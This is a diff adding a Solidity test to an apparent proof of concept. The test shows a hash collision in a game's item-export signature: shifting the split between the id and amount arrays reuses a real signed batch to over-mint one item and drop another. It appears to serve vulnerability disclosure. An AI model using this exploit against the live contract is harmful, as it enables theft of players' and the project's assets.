@@ -62,6 +62,30 @@ contract CollisionPoC is Test {
         assertEq(got717, 0,   "the intended 3 of item #717 were never minted -- the split was subverted");
     }
 
+    /// REAL on-chain batch (export tx 0x842f79... : ids=[4,21,76,83,7], amts=[72,19,18,3,33]).
+    /// Confirms the gate (signer DID sign a len-5 batch) and the HONEST bounded impact: the attacker can only
+    /// re-shuffle the SIGNED words, concentrating the batch's largest word as the amount of a chosen item.
+    function test_RealBatch_ReassignsAmounts() public {
+        uint256 nonce = 7;
+        uint256[] memory ids = new uint256[](5);
+        ids[0]=4; ids[1]=21; ids[2]=76; ids[3]=83; ids[4]=7;
+        uint256[] memory amt = new uint256[](5);
+        amt[0]=72; amt[1]=19; amt[2]=18; amt[3]=3; amt[4]=33;
+        bytes memory sig = _sign(m.digest(player, ids, amt, nonce));
+
+        // ATTACK split: itemIds=[4,21,76,83], itemAmounts=[7,72,19,18,3,33] (shift boundary one word left).
+        // Loop mints (4,7),(21,72),(76,19),(83,18) -> item #21 gets 72 (vs the intended 19, +279%).
+        uint256[] memory idsAtk = new uint256[](4);
+        idsAtk[0]=4; idsAtk[1]=21; idsAtk[2]=76; idsAtk[3]=83;
+        uint256[] memory amtAtk = new uint256[](6);
+        amtAtk[0]=7; amtAtk[1]=72; amtAtk[2]=19; amtAtk[3]=18; amtAtk[4]=3; amtAtk[5]=33;
+
+        assertEq(m.digest(player, ids, amt, nonce), m.digest(player, idsAtk, amtAtk, nonce), "real-batch digests collide");
+        m.exportItemsFromGame(player, idsAtk, amtAtk, nonce, sig);
+        assertEq(items.balanceOf(player, 21), 72, "item #21 over-minted to 72 (intended 19) by re-aligning the batch's words");
+        assertEq(items.balanceOf(player, 7),  0,  "item #7 dropped from the export");
+    }
+
     /// Control: the legit split mints exactly what the backend intended (5 of #100, 3 of #717).
     function test_LegitSplit_MintsIntended() public {
         uint256 nonce = 2;
